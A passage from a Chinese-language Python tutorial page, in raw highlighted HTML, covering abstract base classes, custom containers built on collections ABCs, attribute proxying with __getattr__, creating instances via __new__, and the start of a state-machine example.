class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(self._fields):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> zip(self._fields, args):</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置额外属性值</span></span><br><span class="line">        extra_args = kwargs.keys() - self._fields</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> extra_args:</span><br><span class="line">            setattr(self, name, kwargs.pop(name))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> kwargs:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Duplicate values for &#123;&#125;'</span>.format(<span class="string">','</span>.join(kwargs)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure3)</span>:</span></span><br><span class="line">        _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line">    s1 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line">    s2 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>, date=<span class="string">'8/2/2012'</span>)</span><br></pre></td></tr></table></figure><h4 id="定义接口或者抽象基类"><a href="#定义接口或者抽象基类" class="headerlink" title="定义接口或者抽象基类"></a>定义接口或者抽象基类</h4><p>使用<code>abc</code>模块可以很轻松的定义抽象基类，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IStream</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, maxbytes=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>抽象类的一个特点是它不能直接被实例化，如下方式是错误的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = IStream()</span><br></pre></td></tr></table></figure><p>抽象类的目的就是让别的类继承它并实现特定的抽象方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocketStream</span><span class="params">(IStream)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, maxbytes=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>抽象基类的一个主要用途是在代码中检查某些类是否为特定类型，实现了特定接口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(obj, stream)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(stream, IStream):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected an IStream'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="实现自定义容器"><a href="#实现自定义容器" class="headerlink" title="实现自定义容器"></a>实现自定义容器</h4><p><code>collections</code>定义了很多抽象基类，当你想自定义容器类的时候它们会非常有用。 比如你想让你的类支持迭代，那就让你的类继承<code>collections.Iterable</code>即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(collections.Iterable)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>不过需要实现<code>collections.Iterable</code>所有的抽象方法，否则会报错:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: Can<span class="string">'t instantiate abstract class A with abstract methods __iter__</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(Iterable)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p><code>collections</code>中很多抽象类会为一些常见容器操作提供默认的实现，这样一来你只需要实现那些你最感兴趣的方法即可。假设你的类继承自<code>collections.MutableSequence</code>，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Items</span><span class="params">(collections.MutableSequence)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initial=None)</span>:</span></span><br><span class="line">        self._items = list(initial) <span class="keyword">if</span> initial <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting:'</span>, index)</span><br><span class="line">        <span class="keyword">return</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Setting:'</span>, index, value)</span><br><span class="line">        self._items[index] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        print(<span class="string">'Deleting:'</span>, index)</span><br><span class="line">        <span class="keyword">del</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Inserting:'</span>, index, value)</span><br><span class="line">        self._items.insert(index, value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Len'</span>)</span><br><span class="line">        <span class="keyword">return</span> len(self._items)</span><br></pre></td></tr></table></figure><p>如果你创建<code>Items</code>的实例，你会发现它支持几乎所有的核心列表方法(如<code>append()、remove()、count()</code>等)。 使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Items([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(a)</span><br><span class="line">Len</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">4</span>)</span><br><span class="line">Len</span><br><span class="line">Inserting: <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">2</span>)</span><br><span class="line">Len</span><br><span class="line">Inserting: <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.count(<span class="number">2</span>)</span><br><span class="line">Getting: <span class="number">0</span></span><br><span class="line">Getting: <span class="number">1</span></span><br><span class="line">Getting: <span class="number">2</span></span><br><span class="line">Getting: <span class="number">3</span></span><br><span class="line">Getting: <span class="number">4</span></span><br><span class="line">Getting: <span class="number">5</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.remove(<span class="number">3</span>)</span><br><span class="line">Getting: <span class="number">0</span></span><br><span class="line">Getting: <span class="number">1</span></span><br><span class="line">Getting: <span class="number">2</span></span><br><span class="line">Deleting: <span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="属性的代理访问"><a href="#属性的代理访问" class="headerlink" title="属性的代理访问"></a>属性的代理访问</h4><p>简单来说，代理是一种编程模式，它将某个操作转移给另外一个对象来实现。 最简单的形式可能是像下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B1</span>:</span></span><br><span class="line">    <span class="string">"""简单的代理"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._a.spam(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._a.foo()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>如果有大量的方法需要代理， 那么使用<code>__getattr__()</code>方法会更好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B2</span>:</span></span><br><span class="line">    <span class="string">"""使用__getattr__的代理，代理方法比较多时候"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="string">"""这个方法在访问的attribute不存在的时候被调用"""</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._a, name)</span><br></pre></td></tr></table></figure><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = B2()</span><br><span class="line">b.bar()  <span class="comment"># 调用B.bar() (B2上存在)</span></span><br><span class="line">b.spam(<span class="number">42</span>)  <span class="comment"># 调用B.__getattr__('spam')代理到A.spam</span></span><br></pre></td></tr></table></figure><p>另外一个代理例子是实现代理模式，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        self._obj = obj</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'getattr:'</span>, name)</span><br><span class="line">        <span class="keyword">return</span> getattr(self._obj, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__setattr__(name, value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'setattr:'</span>, name, value)</span><br><span class="line">            setattr(self._obj, name, value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__delattr__(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'delattr:'</span>, name)</span><br><span class="line">            delattr(self._obj, name)</span><br></pre></td></tr></table></figure><p>使用这个代理类时，你只需要用它来包装下其他类即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self, y)</span>:</span></span><br><span class="line">        print(<span class="string">'Spam.bar:'</span>, self.x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create an instance</span></span><br><span class="line">s = Spam(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># Create a proxy around it</span></span><br><span class="line">p = Proxy(s)</span><br><span class="line"><span class="comment"># Access the proxy</span></span><br><span class="line">print(p.x)  <span class="comment"># Outputs 2</span></span><br><span class="line">p.bar(<span class="number">3</span>)  <span class="comment"># Outputs "Spam.bar: 2 3"</span></span><br><span class="line">p.x = <span class="number">37</span>  <span class="comment"># Changes s.x to 37</span></span><br></pre></td></tr></table></figure><p>通过自定义属性访问方法，你可以用不同方式自定义代理类行为。</p><p>代理类有时候可以作为继承的替代方案。例如，一个简单的继承如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>, x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.foo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>)</span><br><span class="line">        super().spam(x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.bar'</span>)</span><br></pre></td></tr></table></figure><p>使用代理的话，就是下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>, x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.foo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>, x)</span><br><span class="line">        self._a.spam(x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.bar'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._a, name)</span><br></pre></td></tr></table></figure><p>当实现代理模式时，还有些细节需要注意。首先，<code>__getattr__()</code>实际是一个后备方法，只有在属性不存在时才会调用。因此，如果代理类实例本身有这个属性的话，那么不会触发这个方法的。另外，<code>__setattr__()</code>和<code>__delattr__()</code>需要额外的魔法来区分代理实例和被代理实例<code>_obj</code>的属性。一个通常的约定是只代理那些不以下划线<code>_</code>开头的属性。</p><p>还有一点需要注意的是，<code>__getattr__()</code>对于大部分以双下划线(<code>__</code>)开始和结尾的属性并不适用。 例如考虑如下的类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListLike</span>:</span></span><br><span class="line">    <span class="string">"""__getattr__对于双下划线开始和结尾的方法是不能用的，需要一个个去重定义"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._items = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._items, name)</span><br></pre></td></tr></table></figure><p>如果是创建一个<code>ListLike</code>对象，会发现它支持普通的列表方法，如<code>append()</code>和<code>insert()</code>， 但是却不支持<code>len()</code>、元素查找等。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = ListLike()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.insert(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(a)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: object of type <span class="string">'ListLike'</span> has no len()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'ListLike'</span> object does <span class="keyword">not</span> support indexing</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>为了让它支持这些方法，必须手动实现这些方法代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListLike</span>:</span></span><br><span class="line">    <span class="string">"""__getattr__对于双下划线开始和结尾的方法是不能用的，需要一个个去重定义"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._items = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._items, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self._items)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        self._items[index] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self._items[index]</span><br></pre></td></tr></table></figure><h4 id="创建不调用init方法的实例"><a href="#创建不调用init方法的实例" class="headerlink" title="创建不调用init方法的实例"></a>创建不调用init方法的实例</h4><p>可以通过<code>__new__()</code>方法创建一个未初始化的实例。例如考虑如下这个类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, year, month, day)</span>:</span></span><br><span class="line">        self.year = year</span><br><span class="line">        self.month = month</span><br><span class="line">        self.day = day</span><br></pre></td></tr></table></figure><p>下面为不调用<code>__init__()</code>方法来创建这个<code>Date</code>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Date.__new__(Date)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&lt;__main__.Date object at <span class="number">0x1006716d0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.year</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'Date'</span> object has no attribute <span class="string">'year'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>结果可以看到，这个<code>Date</code>实例的属性<code>year</code>还不存在，所以你需要手动初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = &#123;<span class="string">'year'</span>:<span class="number">2023</span>, <span class="string">'month'</span>:<span class="number">10</span>, <span class="string">'day'</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line"><span class="meta">... </span>    setattr(d, key, value)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.year</span><br><span class="line"><span class="number">2023</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.month</span><br><span class="line"><span class="number">10</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="实现状态对象或者状态机"><a href="#实现状态对象或者状态机" class="headerlink" title="实现状态对象或者状态机"></a>实现状态对象或者状态机</h4><p>在很多程序中，有些对象会根据状态的不同来执行不同的操作。比如考虑如下的一个连接对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 